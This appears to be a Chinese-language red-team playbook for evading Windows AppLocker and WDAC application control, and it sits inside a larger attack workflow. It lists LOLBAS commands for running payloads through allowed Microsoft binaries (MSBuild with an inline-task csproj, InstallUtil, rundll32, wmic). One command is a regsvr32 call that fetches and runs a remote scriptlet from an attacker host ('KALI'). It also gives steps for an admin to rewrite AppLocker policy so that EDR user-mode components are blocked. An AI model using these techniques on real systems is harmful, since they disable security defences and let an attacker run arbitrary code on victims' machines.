# WDAC / AppLocker / Application Control

阻断来自允许列表，不是 AMSI。先读 **真实 policy**，再滥用已允许的路径/签名/解释器。

---

## 1. 识别 policy

```powershell
Get-AppLockerPolicy -Effective -Xml | Out-File .\applocker-effective.xml
Get-AppLockerPolicy -Effective | Format-List

# WDAC / Code Integrity
Get-CimInstance -Namespace root\Microsoft\Windows\CI -ClassName CI_Configuration -ErrorAction SilentlyContinue
Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' -MaxEvents 30
Get-WinEvent -LogName 'Microsoft-Windows-CodeIntegrity/Operational' -MaxEvents 30
```

Event 8004 / 8023 / CI 3077 能告诉你是 path、publisher 还是 hash 规则拦的。

Constrained Language Mode 常和 AppLocker 脚本规则一起出现：

```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage → 不要再打 AMSI patch，改 LOLBAS
```

---

## 2. 低权：滥用已允许二进制（LOLBAS）

目标：用 **policy 已允许的微软签名二进制** 执行原 payload。

```cmd
:: MSBuild（常见默认允许）
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

:: InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

:: rundll32
rundll32.exe payload.dll,Entry

:: regsvr32（视规则）
regsvr32 /s /n /u /i:http://KALI/file.sct scrobj.dll

:: wmic
wmic process call create "C:\Windows\System32\cmd.exe /c ..."
```

`payload.csproj` 最小骨架（inline task 执行命令）：

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="B">
    <Exec Command="whoami > C:\Windows\Temp\acl-marker.txt"/>
  </Target>
</Project>
```

完整 LOLBAS：https://lolbas-project.github.io

先用 **marker**（whoami 写 temp）证明执行，再换成原 Attack 模块的 payload。payload 若被 AV 拦 → 回到 static-payload / script-runtime，而不是再换一个 LOLBin。

---

## 3. 可写 + 允许路径

```text
规则允许 %WINDIR%\Tasks 或用户可写的“允许路径”
→ 把 payload 放到该路径再执行
```

验证：对该目录有写权限，且 AppLocker path 规则覆盖它。

---

## 4. 管理员：改 policy / GhostLocker 研究路径

已有本地管理员时，可以改 AppLocker 去拦 EDR **用户态** 组件。这是 neutralization，不是低权 bypass。

```text
条件：
- 本地管理员
- AppLocker 服务可用
- 知道 EDR 用户态 exe/dll 精确路径
- 改完后 kernel 驱动可能仍在
Impact: CONTROL
必须：先导出原 policy，测完恢复
```

```powershell
Get-AppLockerPolicy -Effective -Xml | Out-File .\applocker-backup.xml
# 增加拒绝规则指向 EDR 用户态二进制后：
Set-AppLockerPolicy -XmlPolicy .\applocker-modified.xml
appidpolicyconverter.exe  # 视环境
# 验证原被拦动作；完成后：
Set-AppLockerPolicy -XmlPolicy .\applocker-backup.xml
```

Black-cat 提到的 EDR-GhostLocker 属于这类研究。产品路径每个 EDR 不同，不要写“一条规则关掉所有 EDR”。

---

## 5. WDAC

比 AppLocker 严。找：未覆盖签名者、补丁级路径、已签名但可滥用的 WDAC 允许二进制。没有具体 policy 漏洞时不要假装有通用 WDAC bypass。

---

## 6. 成功 / 恢复

```text
SUCCESS: 原 payload 经由允许的宿主执行
Restore: 恢复 AppLocker/WDAC XML；确认安全进程能再启动
Resume: 原 Attack 模块
```
